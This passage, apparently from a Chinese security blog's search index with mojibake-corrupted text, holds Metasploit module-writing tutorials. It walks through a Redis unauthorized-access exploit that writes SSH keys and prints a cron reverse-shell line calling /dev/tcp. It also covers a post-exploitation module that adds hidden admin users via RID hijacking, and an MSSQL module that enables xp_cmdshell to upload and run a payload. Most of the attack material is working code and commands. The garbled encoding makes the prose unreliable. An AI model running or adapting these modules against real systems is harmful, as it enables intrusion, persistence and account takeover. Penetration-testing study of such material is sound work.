string = xml.at(&#x27;string&#x27;)# textæ–¹æ³•ä¹Ÿå¯ä»¥è¢«ç”¨ä½œå»é™¤æ‰€æœ‰HTMLæ ‡ç­¾text = string.text# print_status (&quot;#&#123;text&#125;&quot;)if not text.empty? print_good (&quot;#&#123;user&#125; : #&#123;text&#125;&quot;) # å­˜åœ¨ç”¨æˆ·å†™å…¥æ–‡ä»¶ output = file_local_write( outfile ,&quot;#&#123;user&#125; : #&#123;text&#125;&quot;)endprint_status (&quot;OutFile: #&#123;outfile&#125;&quot;) å®Œæ•´æ¨¡å—è¿è¡ŒDemoï¼š References Metasploit Moduleå¼€å‘WEBç¯‡ å¸¸è§çš„Metasploitæ¨¡å—ç¼–ç é”™è¯¯ å¦‚ä½•ä½¿ç”¨HTTPClientå‘é€HTTPè¯·æ±‚","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”Redisæœªæˆæƒ","slug":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”Redisæœªæˆæƒ","date":"2020-03-31T06:41:21.000Z","updated":"2021-08-19T06:28:54.436Z","comments":true,"path":"2020/0331/.html","link":"","permalink":"https://payloads.cn/2020/0331/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn é¡¹ç›®åœ°å€ï¼šMetasploit Modules å‰è¨€Redisæœªæˆæƒæ¼æ´ï¼Œæ˜¯å†…ç½‘æ¨ªå‘ç§»åŠ¨çš„æ‰‹æ³•ä¹‹ä¸€ï¼Œå¸¸è§çš„åˆ©ç”¨æ–¹å¼ä¸ºSSHå…¬é’¥å†™å…¥ä¸Cronè®¡åˆ’ä»»åŠ¡åå¼¹shellã€‚ä½†æ¯æ¬¡éƒ½æ‰‹åŠ¨å‘½ä»¤æ‰§è¡Œï¼Œç»å¯¹å½±å“æ•ˆç‡ï¼Œæ‰€ä»¥æœ¬æ–‡å°†è¯¥åˆ©ç”¨æ–¹å¼è½¬åŒ–ä¸ºMetasploitæ¨¡å—è¿›è¡Œæ£€æµ‹ä¸åˆ©ç”¨ã€‚ æœªæˆæƒæ£€æµ‹æ£€æµ‹ç›®æ ‡Redisæ˜¯å¦å­˜åœ¨æœªæˆæƒæ¼æ´ï¼Œé€šå¸¸æ˜¯redis-cli -h ipåï¼Œè¾“å…¥infoæ£€æµ‹ç›®æ ‡æ˜¯å¦æœ‰å›æ˜¾ä¿¡æ¯ã€‚ ç¼–å†™Metasploitæ¨¡å—ï¼Œéœ€è¦è½½å…¥Redisæ‰«æç±»ã€‚ 1include Msf::Auxiliary::Redis å®šä¹‰æ£€æµ‹æ–¹æ³•ï¼Œè¿›è¡ŒINFOå‘½ä»¤æ‰§è¡Œï¼Œå¹¶è¾“å‡ºæ•°æ®å›æ˜¾ã€‚ 1234def check info_data = redis_command(&#x27;INFO&#x27;) print_good (&quot;#&#123;info_data&#125;&quot;)end å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€æ­¥å·²ç»å®ç°ã€‚ ä½†æ­¤å¤„éœ€è¦åšä¸ªåˆ¤æ–­ï¼Œå¦‚æœINFOå‘½ä»¤æ‰§è¡Œåï¼Œæ•°æ®å›æ˜¾ä¸­åŒ…å«redis_versionï¼Œå†ç»§ç»­æ‰§è¡Œã€‚å¦åˆ™ï¼Œç»“æŸã€‚ 123456if (info_data = redis_command(&#x27;INFO&#x27;)) &amp;&amp; /redis_version:(?&lt;redis_version&gt;\\S+)/ =~ info_data print_warning (&#x27;The Redis is unauthorized&#x27;)else print_error (&#x27;The Redis is not unauthorized&#x27;) returnend SSHå…¬é’¥å†™å…¥è¿™æ˜¯æ‰‹åŠ¨æ‰§è¡Œçš„å‘½ä»¤ï¼Œéœ€è¦å†™å…¥sshå…¬é’¥æ–‡ä»¶å†…å®¹ï¼Œæ‰èƒ½è·å–ç›®æ ‡ç³»ç»Ÿæƒé™ã€‚ 1234127.0.0.1:6379&gt; config set dir /root/.ssh/127.0.0.1:6379&gt; config set dbfilename authorized_keys127.0.0.1:6379&gt; set x &quot;\\n\\n\\nssh-rsa xxxxxx root@kali\\n\\n\\n&quot;127.0.0.1:6379&gt; save å¦‚æœæ¯æ¬¡è¿›è¡Œsshå…¬é’¥æŸ¥çœ‹ï¼Œå†copyï¼Œå±å®éº»çƒ¦ã€‚æ‰€ä»¥åœ¨æ¨¡å—å¤´éƒ¨æ·»åŠ æ–‡ä»¶é€‰é¡¹ã€‚ 12345register_options( [ Opt::RPORT(6379), OptPath.new(&#x27;SSHPUB&#x27;, [ true, &#x27;The SSH public key location (absolute path)&#x27;, &#x27;/root/.ssh/id_rsa.pub&#x27; ]) ] å®šä¹‰sshå…¬é’¥å†™å…¥æ–¹æ³•ï¼Œå…¶ä¸­authorized_keyå‚æ•°ä¸ºsshå…¬é’¥æ–‡ä»¶ï¼Œè¯»å–åå†™å…¥ã€‚ 12345678def sshpub redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dir&#x27;, &#x27;/root/.ssh/&#x27;) redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dbfilename&#x27;, &#x27;authorized_keys&#x27;) authorized_key = &quot;\\n\\n\\n&quot; + File.read(&quot;#&#123;datastore[&#x27;SSHPUB&#x27;]&#125;&quot;) + &quot;\\n\\n\\n&quot; redis_command(&#x27;SET&#x27;, &#x27;x&#x27;, authorized_key) redis_command(&#x27;SAVE&#x27;) print_good (&#x27;SSH public key was written successfully&#x27;)end Cronè®¡åˆ’ä»»åŠ¡åå¼¹å¦‚æœç›®æ ‡æœºä¸­æ²¡æœ‰/root/.ssh/ç›®å½•ï¼Œè¿˜æœ‰å¯ä»¥ä½¿ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹Shellã€‚å› ä¸ºæ˜¯åå‘è¿æ¥ï¼Œæ‰€ä»¥åœ¨ç›®æ ‡ç½‘ä¸­éœ€è¦æ‰¾å¦ä¸€å°å¯é€šè®¯ä¸»æœºè¿›è¡ŒNCç›‘å¬ï¼Œæ•…æç¤ºåå¼¹å‘½ä»¤ã€‚ 1234567(info_data = redis_command(&#x27;CONFIG&#x27;, &#x27;SET&#x27;, &#x27;dir&#x27;, &#x27;/var/spool/cron/&#x27;)) &amp;&amp; /OK/ =~ info_dataprint_line (&quot;&lt;----------------Please use the Cron GetShell----------------&gt;&quot;)print_line (&quot;set xx &#x27;\\\\n* * * * * bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\\\\n&#x27;&quot;)print_line (&quot;config set dir /var/spool/cron/&quot;)print_line (&quot;config set dbfilename root&quot;)print_line (&quot;save&quot;)print_line (&quot;&lt;-------------------------------------------------------------&gt;&quot;) å®Œæ•´æ¨¡å—è¿è¡ŒDemoï¼š References Metasploit API Metasploit WIKI","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”å…‹éš†ç”¨æˆ·","slug":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”å…‹éš†ç”¨æˆ·","date":"2020-03-26T16:56:12.000Z","updated":"2021-08-19T06:29:13.776Z","comments":true,"path":"2020/0327/.html","link":"","permalink":"https://payloads.cn/2020/0327/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn é¡¹ç›®åœ°å€ï¼šMetasploit Modules å‰è¨€åœ¨è¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨æ—¶ï¼Œå¯ä»¥ç†è§£ä¸ºåæ¸—é€è¿‡ç¨‹ï¼Œå¦‚ä½•åˆ©ç”¨Metasploitæ‰“é€ åæ¸—é€æ¨¡å—ï¼Œå¦‚ä½•åŸºäºsessionè¿›è¡Œæ“æ§ï¼Ÿæ¯”å¦‚: åœ¨å½“å‰ä¼šè¯ä¸Šæ£€æŸ¥ç³»ç»Ÿæƒé™ï¼Œæˆ–è€…æ·»åŠ ç”¨æˆ·ç­‰ã€‚æœ€ç»ˆè§£å†³å®æˆ˜ä¸­çš„éœ€æ±‚ï¼šåˆ©ç”¨å·²è·å–sessionï¼Œåˆ›å»ºç™»å½•è´¦æˆ·ï¼Œæ·»åŠ è¯¥è´¦æˆ·åˆ°ç®¡ç†å‘˜ä¸è¿œç¨‹æ¡Œé¢ç»„ï¼Œå¹¶å…‹éš†administratorï¼Œä»è€Œæ›¿ä»£clone.exeã€‚ ç¼–å†™åæ¸—é€æ¨¡å—ä»£ç å¤´éƒ¨ä»…éœ€è¦åœ¨å¤´éƒ¨æ·»åŠ meterpreterä¼šè¯çš„ç±»å‹ï¼Œè¯¥æ¨¡å—å°±å¯ä»¥åœ¨sessionä¸Šè¿›è¡Œæ“æ§ã€‚ æ£€æŸ¥ä¼šè¯æƒé™è¿™é‡Œç¼–å†™ä¸€ä¸ªç®€å•çš„æ¨¡å—ï¼Œæ£€æŸ¥å½“å‰ä¼šè¯æ˜¯å¦å…·æœ‰ç®¡ç†å‘˜æƒé™,å¼•ç”¨ lib/msf/core/post/windows/priv.rbä¸­çš„is_admin?å‡½æ•°ã€‚ 1234567891011def run # æ£€æŸ¥ä¼šè¯çš„ç‰¹æƒ print_status(&quot;Checking for SYSTEM privileges on session&quot;) admin_check = is_admin? if(admin_check) print_good(&quot;\\tCurrent User Is Admin&quot;) else print_error(&quot;\\tCurrent User is Not Admin&quot;) endend å¦‚æœè¯´æƒé™ä¸è¶³ï¼Œå¯ä»¥åœ¨å½“å‰sessionå°è¯•ææƒï¼ŒåŒæ—¶ä¹Ÿæ˜¯å¼•ç”¨priv.rbã€‚åœ¨Module optionsä¸­å¯å¢åŠ æ¨¡å—é€‰é¡¹ï¼Œè¿›è¡Œè®¾ç½®ã€‚ 1234register_options( [ OptBool.new(&#x27;GETSYSTEM&#x27;, [true, &#x27;Attempt to get SYSTEM privilege on the target host.&#x27;, false]), ]) å½“getsystemä¸ºtrueæ—¶ï¼Œè¿è¡Œå¦‚ä¸‹å®šä¹‰ï¼š 12345678def getsystem results = session.priv.getsystem if results[0] return true else return false endend runä¸»å‡½æ•°ä¹Ÿå¯ä½¿ç”¨is_system?ï¼Œå¯¹å½“å‰ä¼šè¯çš„ç³»ç»Ÿæƒé™æ£€æŸ¥ã€‚ 12345678910111213141516171819202122232425def run # æ£€æŸ¥æ“ä½œç³»ç»Ÿç‰ˆæœ¬ wver = sysinfo[&quot;OS&quot;] print_status(&quot;Target OS: #&#123;wver&#125;&quot;) # æ£€æŸ¥ä¼šè¯çš„ç‰¹æƒï¼Œå¹¶åœ¨éœ€è¦æ—¶å°è¯•è·å¾—ç³»ç»Ÿç‰¹æƒã€‚ print_status(&quot;Checking for SYSTEM privileges on session&quot;) if !is_system? if datastore[&#x27;GETSYSTEM&#x27;] print_status(&quot;Trying to get SYSTEM privileges&quot;) if getsystem print_good(&quot;\\tGet SYSTEM privileges&quot;) else print_error(&quot;Could not obtain SYSTEM privileges&quot;) return end else print_error(&quot;Session is not running with SYSTEM privileges. Try setting GETSYSTEM &quot;) return end else print_good(&quot;\\tSession is already running with SYSTEM privileges&quot;) end return nilend æ£€æŸ¥å½“å‰ä¼šè¯æƒé™ä¸å°è¯•ææƒçš„å®Œæ•´Demoï¼š æ·»åŠ ç”¨æˆ·ä»¥ä¸Šä¸€ä¸ªç®€å•çš„Demoå·²ç»å®ç°äº†å½“å‰ä¼šè¯çš„æƒé™æ£€æŸ¥ï¼Œä¹‹åç¼–å†™åˆ©ç”¨å½“å‰sessionåˆ›å»ºç”¨æˆ·ï¼Œå¹¶ä¸”åœ¨æœªè®¾ç½®å¯†ç æ—¶ï¼Œå¯éšæœºè®¾ç½®8ä½å¯†ç ï¼Œå¢åŠ ä¸€äº›å¤æ‚åº¦ã€‚ 123456789101112131415161718def add_users if datastore[&#x27;PASSWORD&#x27;].nil? # åˆ›å»ºéšæœº8ä½å¯†ç  datastore[&#x27;PASSWORD&#x27;] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2) print_status(&quot;You have not set up a PASSWORD. The default is &#x27;#&#123;datastore[&#x27;PASSWORD&#x27;]&#125;&#x27;&quot;) end # æ·»åŠ ç”¨æˆ· if enum_user.include? datastore[&#x27;USERNAME&#x27;] print_error(&quot;User &#x27;#&#123;datastore[&#x27;USERNAME&#x27;]&#125;&#x27; already exists.&quot;) else result = add_user(datastore[&#x27;USERNAME&#x27;], datastore[&#x27;PASSWORD&#x27;]) if result[&#x27;return&#x27;] == 0 print_good &quot;\\tAdding User: #&#123;datastore[&#x27;USERNAME&#x27;]&#125; with Password: #&#123;datastore[&#x27;PASSWORD&#x27;]&#125;&quot; else check_result(result) end endend æ·»åŠ ç®¡ç†å‘˜ä¸è¿œç¨‹æ¡Œé¢ç»„åˆ›å»ºå®Œç”¨æˆ·åï¼Œè¿˜éœ€è¦å°†è¯¥ç”¨æˆ·æ·»åŠ ç®¡ç†å‘˜ç»„ï¼Œä½¿è¯¥ç”¨æˆ·æœ‰æ›´é«˜çš„æƒé™ã€‚å¹¶ä¸”åœ¨è¿œç¨‹æ¡Œé¢æ—¶ï¼Œå¯èƒ½ä¹Ÿéœ€è¦æ·»åŠ è‡³è¿œç¨‹æ¡Œé¢ç»„ã€‚ è¯¥å®šä¹‰å¼•ç”¨äº†post/windows/manage/enable_rdpéƒ¨åˆ†ä»£ç ã€‚ å…‹éš†ç”¨æˆ·è¿™æ®µä»£ç çš„å®šä¹‰å®é™…åº”ç”¨äº†Windows RIDåŠ«æŒæŠ€æœ¯ï¼Œåœ¨å®æˆ˜ä¸­åº”ç”¨çš„æ›´å¤šçš„æ˜¯Clone.exeï¼Œå…¶åŸç†å¤§åŒå°å¼‚ã€‚ Metasploitä¸­çš„post/windows/manage/rid_hijackæ¨¡å—æ­£æ˜¯åˆ©ç”¨RIDåŠ«æŒæŠ€æœ¯å®ç°äº†è¿™ä¸€ç‚¹ã€‚ æœ€åï¼Œå°†ä»¥ä¸Šè®²è¿°çš„ä»£ç ä¸rid_hijackæ¨¡å—ç»“åˆï¼Œä¾¿è§£å†³äº†æ–‡ç« å¼€ç¯‡æå‡ºçš„å®æˆ˜éœ€æ±‚ï¼šåˆ©ç”¨å·²è·å–sessionï¼Œåˆ›å»ºç™»å½•è´¦æˆ·ï¼Œæ·»åŠ è¯¥è´¦æˆ·åˆ°ç®¡ç†å‘˜ä¸è¿œç¨‹æ¡Œé¢ç»„ï¼Œå¹¶å…‹éš†administratorï¼Œä»è€Œæ›¿ä»£clone.exeã€‚ References Metasploit API Metasploit WIKI RID Hijacking on Windows","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”MSSQLé‡æ„","slug":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”MSSQLé‡æ„","date":"2020-03-25T11:05:08.000Z","updated":"2021-08-19T06:23:58.909Z","comments":true,"path":"2020/0325/.html","link":"","permalink":"https://payloads.cn/2020/0325/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn é¡¹ç›®åœ°å€ï¼šMetasploit Modules å‰è¨€åœ¨è¿›è¡Œå†…ç½‘æ¸—é€æ—¶ï¼Œæœ‰æ—¶ä¼šé‡åˆ°SQL Serveræ•°æ®åº“ï¼Œå½“è·å–åˆ°æ­£ç¡®å£ä»¤ä¿¡æ¯æ—¶ï¼Œç»å¸¸ä¼šç”¨åˆ°SQLTOOLSä¸€ç±»çš„æ¸—é€å·¥å…·ï¼Œä½†ä¾èµ–xp_cmdshelléœ€è¦å¼€å¯ï¼Œæ‰èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚è¿™é‡Œå°±è”æƒ³åˆ°å®æˆ˜ä¸­çš„éœ€æ±‚ï¼Œä¹Ÿæ­£æ˜¯æœ¬æ–‡è¦è®²è¿°çš„æ–¹æ³•ï¼š**åˆ©ç”¨Metasploitï¼Œé€šè¿‡æ­£ç¡®çš„SQL Serverå£ä»¤ä¿¡æ¯ï¼Œå¯å¯ç”¨xp_cmdshellï¼Œå¹¶è·å–ç›®æ ‡ç³»ç»Ÿsession**ã€‚ å‚æ•°msftidyä½¿ç”¨Metasploitä¸­åä¸ºmsftidyçš„å†…ç½®å·¥å…·ï¼Œæ£€æŸ¥å¼€å‘çš„æ¨¡å—è¯­æ³•æ˜¯å¦æ­£ç¡®ã€‚ loadpathMetasploitæ¯æ¬¡æ›´æ–°ï¼Œæ‰€æœ‰æ¨¡å—éƒ½ä¼šè¢«åˆ é™¤ï¼Œåˆ›å»ºå¤–éƒ¨ç›®å½•ä¸è¢«åˆ é™¤ï¼ˆè™šæ‹Ÿåˆ†æ”¯ï¼‰: å¤–éƒ¨ç›®å½•è¦ä¸msfç›®å½•ç»“æ„ç›¸åŒï¼Œä¹‹ååœ¨msfä¸­ä½¿ç”¨loadpath ç»å¯¹è·¯å¾„/Metasploit/è½½å…¥ã€‚ å½“å‰msfé€‚ç”¨ï¼Œé€€å‡ºåéœ€è¦é‡æ–°åŠ è½½loadpath reloadåœ¨ä¸å…³é—­metasploitçš„æƒ…å†µä¸‹ä½¿ç”¨reloadå‘½ä»¤é‡æ–°è½½å…¥ç¼–è¾‘è¿‡çš„æ¨¡å—ã€‚ å†…ç½®æ¨¡å—æµ‹è¯•Metasploitä¸­å†…ç½®äº†mssql_payloadæ¨¡å—ï¼Œä½†æ”»å‡»æ•ˆæœä¸æ˜¯å¾ˆå¥½ï¼Œsessionå¼¹ä¸å›æ¥ã€‚ ç¼–å†™mssql_powershellæ¨¡å—mssql_powershellæ˜¯åœ¨mssql_payloadåŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹çš„ã€‚ æ¥ä¸‹æ¥è¿›è¡Œåˆ†è§£è®²è¿°ï¼š ä»£ç å¤´éƒ¨1234567891011121314151617181920212223242526272829303132### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require &#x27;msf/core&#x27; # å¼•ç”¨ core æ ¸å¿ƒåº“class MetasploitModule &lt; Msf::Exploit::Remote # å®šä¹‰è¿™æ˜¯ä¸€ä¸ªè¿œç¨‹æ”»å‡»æ¨¡å— Rank = ExcellentRanking include Msf::Exploit::Remote::MSSQL # åŒ…å« lib/msf/core/exploit/mssql.rb åº“ def initialize(info = &#123;&#125;) super(update_info(info, &#x27;Name&#x27; =&gt; &#x27;Microsoft SQL Server Powershell payload &#x27;, # %q å•å¼•å·å­—ç¬¦ä¸² &#x27;Description&#x27; =&gt; %q&#123; This module will deliver our payload through Microsoft PowerShell using MSSQL based attack vectors. &#125;, &#x27;Author&#x27; =&gt; [ &#x27;AnonySec@DropLab&#x27;, ], &#x27;License&#x27; =&gt; MSF_LICENSE, &#x27;Platform&#x27; =&gt; &#x27;win&#x27;, # ä»…æ”¯æŒwindowså¹³å° &#x27;Arch&#x27; =&gt; [ ARCH_X86, ARCH_X64 ], &#x27;Targets&#x27; =&gt; [ [ &#x27;Automatic&#x27;, &#123; &#125; ], ], &#x27;DefaultTarget&#x27; =&gt; 0, )) åŸºæœ¬é€‰é¡¹ Boolean å¸ƒå°”é€‰é¡¹ç±»å‹ https://rapid7.github.io/metasploit-framework/api/Msf/OptBool.html Required (å‚æ•°æ˜¯å¦ä¸ºå¿…å¡«é¡¹) â€œfalseâ€ Current Setting (å½“å‰çš„è®¾ç½®) â€œtrueâ€ å³é»˜è®¤ä½¿ç”¨ PowerShell 1234register_options( [ OptBool.new(&#x27;UsePowerShell&#x27;, [ true, &quot;Use Powershell as payload delivery method instead&quot;,true ]) ]) æ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´å¯è¢«åˆ©ç”¨1234567891011121314151617def check if !mssql_login_datastore vprint_status(&quot;Invalid SQL Server credentials&quot;) return Exploit::CheckCode::Detected end # æŸ¥è¯¢mssqlç‰ˆæœ¬ mssql_query(&quot;select @@version&quot;, true) if mssql_is_sysadmin vprint_good &quot;User #&#123;datastore[&#x27;USERNAME&#x27;]&#125; is a sysadmin&quot; Exploit::CheckCode::Vulnerable else Exploit::CheckCode::Safe end ensure disconnect end å¯ç”¨xpcmdshellå…ˆä»¥SQLTOOLSå·¥å…·å°è¯• å›åˆ°ä»£ç ä¸­ï¼Œå¼•ç”¨mssql.rbä¸­çš„mssql_xpcmdshellæ–¹æ³• 123def run mssql_xpcmdshell(datastore[&#x27;CMD&#x27;], true) if mssql_login_datastoreend å®šä¹‰ä¸»ä½“ä»£ç å®šä¹‰upload_powershell_execä¸»è¦å‡½æ•°ï¼Œexeæ˜¯ä»ä¸‹é¢Msf::Util::EXE.to_win32pe(framework,payload.encoded)å‘è¿‡æ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ 1def upload_powershell_exec(exe, debug=false) è°ƒè¯•çŠ¶æ€ä¸‹debug=trueçš„è¾“å‡º åå…­è¿›åˆ¶è½¬æ¢ï¼Œåˆ›å»ºéšæœºæ–‡ä»¶åï¼Œè¾“å‡ºçŠ¶æ€ 123456# åå…­è¿›åˆ¶è½¬æ¢ï¼Œâ€œH:æ‰“å¼€äºŒè¿›åˆ¶æ ¼å¼çš„æ–‡ä»¶ï¼Œä»¥åå…­è¿›åˆ¶è½¬æ¢â€œhex = exe.unpack(&quot;H*&quot;)[0]# åˆ›å»ºéšæœº8ä½å­—æ¯çš„æ–‡ä»¶åvar_payload = rand_text_alpha(8)# payloadä¿ç•™åœ¨ç›®æ ‡ç³»ç»Ÿ C:\\Windows\\\\Temp\\ ç›®å½•ä¸‹print_status(&quot;Warning: This module will leave #&#123;var_payload&#125;.exe in the SQL Server C:\\\\Windows\\\\Temp\\\\ directory&quot;) é€šè¿‡powershellåˆ›å»ºä¸€ä¸ªä»åå…­è¿›åˆ¶è‡³äºŒè¿›åˆ¶çš„è½¬æ¢ï¼š$så˜é‡ä¸­çš„ `r ä¸ `næ›¿æ¢ç©ºå­—ç¬¦ï¼Œå»é™¤å›è½¦æ¢è¡Œç¬¦ï¼Œç”±äºMSSQLå­˜åœ¨ä¸€ä¸ªå­—ç¬¦é•¿åº¦é™åˆ¶ï¼Œéœ€è¦å°†åå…­è¿›åˆ¶çš„payloadåˆ†æˆ500å­—èŠ‚åˆ†å—ï¼Œpayloadè¢«åˆ†åˆ°å¤šä¸ªè¯·æ±‚ä¸­ï¼Œä¼ åˆ°ç›®æ ‡ç³»ç»Ÿä¸­å°±ä¼šè¢«æ·»åŠ å›è½¦æ¢è¡Œç¬¦ã€‚å¦‚ä¸å»é™¤ï¼Œç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶å°†æŸåï¼Œå°±ä¸èƒ½æ‰§è¡Œï¼›é€šè¿‡[Convert]::ToByte è®©powershellå°†åå…­è¿›åˆ¶çš„æ–‡ä»¶å†™å…¥åˆ° #&#123;var_payload&#125;.exe äºŒè¿›åˆ¶ç¨‹åºä¸­ 1h2b = &quot;$s = gc &#x27;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&#x27;;$s = [string]::Join(&#x27;&#x27;, $s);$s = $s.Replace(&#x27;`r&#x27;,&#x27;&#x27;); $s = $s.Replace(&#x27;`n&#x27;,&#x27;&#x27;);$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %&#123;$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)&#125;;[IO.File]::WriteAllBytes(&#x27;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;.exe&#x27;,$b)&quot; è½¬æ¢ç¼–ç ï¼Œè¾“å‡ºçŠ¶æ€ 123456# å°†h2bå­—ç¬¦ä¸²è½¬æ¢ä¸ºUnicodeç¼–ç h2b_unicode=Rex::Text.to_unicode(h2b)# å°†Unicodeå­—ç¬¦ä¸²è¿›è¡Œbase64ç¼–ç h2b_encoded = Rex::Text.encode_base64(h2b_unicode)# è¾“å‡ºçŠ¶æ€ï¼Œæ­£åœ¨ä¸Šä¼ payloadprint_status(&quot;Uploading the payload #&#123;var_payload&#125;, please be patient...&quot;) è®¡æ•°å™¨idxæ¯æ¬¡å¢é•¿cnt(500)ä¸ªå­—èŠ‚ã€‚ç®€å•è¯´ï¼šè¯»å–500å­—èŠ‚ï¼Œå‘é€ï¼Œå†è¯»å–ï¼Œå†å‘é€ï¼Œç›´åˆ°è¯»åˆ°æ–‡ä»¶æœ«å°¾ã€‚ 12345678# åŸºç¡€è®¡æ•°å™¨idxæœ€åˆä½ç½®ä¸º0ï¼Œæ ‡è¯†æ–‡ä»¶æœ«å°¾idx = 0# æ¯æ¬¡å‘é€åå…­è¿›åˆ¶æ–‡ä»¶åˆ°æ“ä½œç³»ç»Ÿæ—¶é€’å¢500å­—èŠ‚ã€‚cnt = 500while(idx &lt; hex.length - 1) mssql_xpcmdshell(&quot;cmd.exe /c echo #&#123;hex[idx, cnt]&#125;&gt;&gt;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&quot;, false) idx += cntend åˆ©ç”¨PowerShell EncodedCommandå‘½ä»¤è½¬æ¢payloadï¼Œä¹‹åæ‰§è¡Œï¼Œè¾“å‡ºç›¸å…³çŠ¶æ€ 123456print_status(&quot;Converting the payload utilizing PowerShell EncodedCommand...&quot;)mssql_xpcmdshell(&quot;powershell -EncodedCommand #&#123;h2b_encoded&#125;&quot;, debug)mssql_xpcmdshell(&quot;cmd.exe /c del C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&quot;, debug)print_status(&quot;Executing the payload...&quot;)mssql_xpcmdshell(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;.exe&quot;, false, &#123;:timeout =&gt; 1&#125;)print_status(&quot;Be sure to cleanup #&#123;var_payload&#125;.exe...&quot;) æ”»å‡»æ¨¡å—çš„ä¸»ä½“ä»£ç ä½¿ç”¨12345678910111213def exploit # æ£€æŸ¥æ˜¯å¦å·²ç»æ­£å¸¸ç™»é™† if !mssql_login_datastore # å£ä»¤é”™è¯¯æ— æ³•ç™»é™†è¾“å‡ºè¯¥çŠ¶æ€ â€œ[*] xx.xx.xx.xx:1433 - Invalid SQL Server credentialsâ€ print_status(&quot;Invalid SQL Server credentials&quot;) return end # UsePowerShell æ–¹æ³•è°ƒç”¨ upload_powershell_exec å‡½æ•° if (datastore[&#x27;UsePowerShell&#x27;]) # Msf::Util::EXE.to_win32pe(framework,payload,encoded) è‡ªåŠ¨äº§ç”Ÿä¸€ä¸ªå¯ç”¨çš„äºŒè¿›åˆ¶payload # https://rapid7.github.io/metasploit-framework/api/Msf/Util/EXE.html#to_win32pe-class_method upload_powershell_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded)) end å¤„ç†ä¸ç›®æ ‡ç³»ç»Ÿé—´çš„è¿æ¥12handlerdisconnect å®Œæ•´è½½å…¥è¿è¡Œ1234567msf5 &gt; loadpath /Users/anonysec/Desktop/Metasploit/msf5 &gt; use exploit/windows/mssql/mssql_powershellmsf5 exploit(windows/mssql/mssql_powershell) &gt; set payload windows/meterpreter/bind_tcpmsf5 exploit(windows/mssql/mssql_powershell) &gt; set rhost 192.168.144.212msf5 exploit(windows/mssql/mssql_powershell) &gt; set password Admin123msf5 exploit(windows/mssql/mssql_powershell) &gt; set lport 5353msf5 exploit(windows/mssql/mssql_powershell) &gt; run æ³¨ï¼šè°ƒè¯•çŠ¶æ€ä¸‹debug=true å°ç»“åªè¦å¯¹Metasploitæ¡†æ¶æœ‰å…´è¶£ï¼Œå¹¶å·²ç»æŸ¥çœ‹äº†ç°æœ‰ä»£ç æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œå°±å¯ä»¥å……åˆ†åˆ©ç”¨ç°æœ‰ä»£ç ï¼Œæ‹¿è¿‡æ¥æ”¹æ”¹ï¼Œå¹¶å¢åŠ ä¸€äº›åŸåˆ›ä»£ç è¿™æ ·çš„æµç¨‹ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ²¡å¿…è¦å®Œå…¨ä»é›¶å¼€å§‹æ¥ç¼–å†™è‡ªå·±çš„æ¨¡å—ä»£ç ã€‚è¿™å°±æ˜¯ä»£ç é‡ç”¨çš„èƒ½é‡ã€‚ References Metasploit API Metasploit WIKI ã€ŠMetasploit: The Penetration Testerâ€™s Guideã€‹","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”åˆ†æHTTPæ¨¡å—","slug":"æ‰“é€ 